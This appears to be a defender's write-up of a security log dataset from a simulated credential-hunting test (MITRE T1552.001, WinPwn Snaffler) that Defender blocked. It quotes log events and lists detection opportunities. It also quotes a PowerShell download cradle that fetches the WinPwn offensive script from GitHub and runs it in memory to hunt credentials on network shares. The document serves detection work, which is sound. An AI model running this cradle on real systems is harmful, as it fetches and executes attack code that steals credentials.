# T1552.001-8: Credentials In Files — WinPwn - Snaffler

## Technique Context

MITRE ATT&CK T1552.001 (Credentials in Files) includes network share credential hunting as well as local file searching. Test 8 uses WinPwn's `Snaffler` function, which wraps the Snaffler tool by SnaffCon. Snaffler performs targeted credential hunting across network file shares, looking for files with credential-bearing names or contents (configuration files, scripts, SSH keys, password spreadsheets, etc.) and prioritizing findings by sensitivity. When run from a domain-joined workstation, it also enumerates accessible shares across the domain. Like test 7, WinPwn is downloaded from GitHub at runtime and executed in memory. In this execution, Defender blocked it via AMSI.

## What This Dataset Contains

The dataset spans approximately eight seconds (00:26:14–00:26:22 UTC) and contains 93 events across three log sources.

**The technique attempt and Defender block are captured.** PowerShell EID 4104 script block logging preserves the test framework command:

```
& {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Snaffler -noninteractive -consoleoutput}
```

The EID 4103 module log records `CommandInvocation(New-Object)` with `TypeName: net.webclient`, confirming the download was initiated.

PowerShell EID 4100 records the AMSI block:

```
Error Message = At line:1 char:1
+ #  Global TLS Setting for all functions. If TLS12 isn't suppported yo ...
This script contains malicious content and has been blocked by your antivirus software.
Fully Qualified Error ID = ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpression
```

Sysmon EID 11 records a file creation event: PowerShell wrote `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-Interactive`, which is a routine PowerShell profile data file and not related to the technique.

Security EID 4688 records the PowerShell process launch and EID 4689 records the exit.

Compared to test 7 (sensitivefiles), this test notably does **not** produce Sysmon EID 3 (network connection) or EID 22 (DNS query) events in the bundled data, suggesting the download either used a cached connection or the network events were not captured in this collection window — though the EID 4103 module log confirms the download was attempted. This may reflect timing differences in Sysmon's network monitoring.

## What This Dataset Does Not Contain (and Why)

**Snaffler did not execute.** Defender blocked WinPwn before the `Snaffler` function could run. No share enumeration, no file scanning, no network connections to SMB shares, and no Snaffler output appear in the data.

**No network share telemetry.** Snaffler's primary value — scanning domain shares — produced no telemetry because execution was blocked before any network activity.

**No DNS or TCP events** for this specific test window, unlike the parallel test 7 execution which captured them. The absence likely reflects the Cribl Edge collection window boundary rather than a true absence of network activity.

## Assessment

This dataset closely mirrors test 7 in structure: both represent a WinPwn download cradle blocked by Defender. The key differentiator visible in the data is the specific function name (`Snaffler` vs `sensitivefiles`) in the script block log, which is the primary mechanism for distinguishing which WinPwn capability was invoked. The eight-second window and 93 events are consistent with the previous test. For defenders, the detection story for tests 7, 8, and 9 is nearly identical — the WinPwn download cradle is the universal indicator, and the function name in the 4104 script block allows attribution to a specific capability. The Snaffler-specific variant is notable because successful Snaffler execution would produce significant additional telemetry (SMB connections, share enumeration) that this dataset does not contain.

## Detection Opportunities Present in This Data

- **PowerShell EID 4104**: Script block containing both the WinPwn GitHub URL and `Snaffler` as a function call. The specific function name distinguishes this from other WinPwn tests.
- **PowerShell EID 4100**: `ScriptContainedMaliciousContent` from `Invoke-Expression` combined with a preceding script block referencing WinPwn.
- **PowerShell EID 4103**: `CommandInvocation(New-Object)` with `net.webclient` immediately followed by `downloadstring` is a textbook in-memory download cradle — detectable regardless of the URL.
- **Behavioral pattern**: PowerShell executing as NT AUTHORITY\SYSTEM (from a non-interactive session), setting execution policy to Bypass, then calling `iex((new-object net.webclient).downloadstring(...))` is a high-confidence malicious pattern even without specific URL matching.
- **Correlation with test 7 and 9**: These three tests use identical infrastructure. A detection that fires on the WinPwn URL (with or without the specific commit hash) would cover all three variants. The commit hash `121dcee26a7aca368821563cbe92b2b5638c5773` is a high-fidelity exact indicator.
